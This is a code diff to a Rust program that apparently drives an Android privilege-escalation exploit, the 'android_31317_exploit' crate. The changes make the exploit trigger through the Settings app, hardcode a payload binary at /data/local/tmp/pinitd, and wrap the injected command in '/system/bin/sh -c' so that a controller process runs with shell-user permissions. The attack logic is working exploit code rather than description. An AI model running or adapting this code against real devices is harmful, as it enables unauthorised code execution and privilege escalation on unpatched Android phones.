@@ -4,7 +4,7 @@ extern crate android_logger;
 
 use std::{env::current_exe, path::PathBuf};
 
-use android_31317_exploit::exploit::{ExploitKind, execute, payload};
+use android_31317_exploit::exploit::{ExploitKind, TriggerApp, execute, payload};
 use android_logger::Config;
 use clap::Parser;
 use controller::Controller;
@@ -52,7 +52,13 @@ fn run() -> Result<(), Error> {
             init_logging_with_tag(None);
             warn!("Requesting controller start");
             let payload = init_payload(executable)?;
-            Ok(execute(&payload, None)?)
+            Ok(execute(
+                &payload,
+                &TriggerApp::new(
+                    "com.android.settings".into(),
+                    "com.android.settings.Settings".into(),
+                ),
+            )?)
         }
         Args::Controller => {
             // Spawn the worker and enter work loop
@@ -68,8 +74,9 @@ fn run() -> Result<(), Error> {
         Args::BuildPayload => {
             init_logging_with_tag(None);
             warn!("Building init payload only");
-            let payload = init_payload(executable)?;
-            println!("{payload}");
+            let payload = init_payload("/data/local/tmp/pinitd".into())?;
+            // Write to stdout
+            print!("{payload}");
             Ok(())
         }
     }
@@ -93,7 +100,11 @@ fn init_payload(executable: PathBuf) -> Result<String, Error> {
         "/data/local/tmp/",
         "com.android.shell",
         "platform:shell:targetSdkVersion=29:complete",
-        &ExploitKind::Command(format!("{} controller", executable.display())),
+        // Wrap command in sh to ensure proper permissions
+        &ExploitKind::Command(format!(
+            "/system/bin/sh -c \"{} controller\"",
+            executable.display()
+        )),
         Some("com.android.shell"),
     )?)
 }
